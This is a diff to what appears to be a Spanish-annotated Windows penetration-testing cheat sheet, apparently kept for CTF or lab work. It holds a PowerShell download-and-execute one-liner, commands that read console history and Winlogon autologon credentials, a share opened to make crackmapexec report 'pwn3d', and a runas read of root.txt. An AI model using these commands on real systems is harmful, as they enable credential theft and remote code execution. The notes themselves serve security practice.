@@ -107,7 +107,6 @@ $file = ".\b64.txt"; $data = Get-Content $file; [System.Text.Encoding]::Ascii.Ge
 python windows-exploit-suggester.py -i systeminfo -d 2021-10-04-mssb.xls --ostext 'windows 10.0.14393 N/A Build 14393' -lq
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
-
 net localgroup Administrators --> lista los miembros del grupo Administrators
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
 icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
@@ -159,7 +158,7 @@ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http
 setspn.exe -T medin -Q */* #extract all users in SPN
 
 # Console_history
-ConsoleHost_Historyta\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 # Habilitar pwn3d (crackmapexec)
 net share COMPARTIDA=C:\Windows\Temp /GRANT:Administrators,FULL
@@ -185,3 +184,9 @@ Invoke-WebRequest -Uri $url -OutFile $dest -Credential $creds
 reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
 reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
 reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
+
+# para chequear claves de usuarios que se autologuean
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" 
+
+# runas
+runas /user:administrator "type C:\Users\Administrator\Desktop\root.txt"
